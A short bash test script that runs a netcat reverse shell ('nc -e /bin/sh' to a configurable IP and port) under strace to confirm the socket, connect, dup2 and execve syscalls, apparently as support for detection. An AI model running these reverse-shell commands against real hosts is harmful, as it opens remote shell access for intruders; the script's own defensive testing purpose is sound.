#!/bin/bash
# Test: Trace syscalls from netcat reverse shell
# Purpose: Verify netcat makes socket(), connect(), dup2(), execve() syscalls
# Expected: Should see all 4 syscall types (if ncat supports -e)

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-4444}"

echo "🔬 Tracing netcat reverse shell syscalls..."
echo "   Target: $TARGET_IP:$TARGET_PORT"
echo ""

if command -v ncat &> /dev/null; then
    strace -e trace=socket,connect,dup2,execve ncat "$TARGET_IP" "$TARGET_PORT" -e /bin/sh 2>&1 | grep -E "socket|connect|dup2|execve"
elif command -v nc &> /dev/null; then
    strace -e trace=socket,connect,dup2,execve nc -e /bin/sh "$TARGET_IP" "$TARGET_PORT" 2>&1 | grep -E "socket|connect|dup2|execve"
else
    echo "❌ No netcat variant found (ncat/nc)"
    exit 1
fi
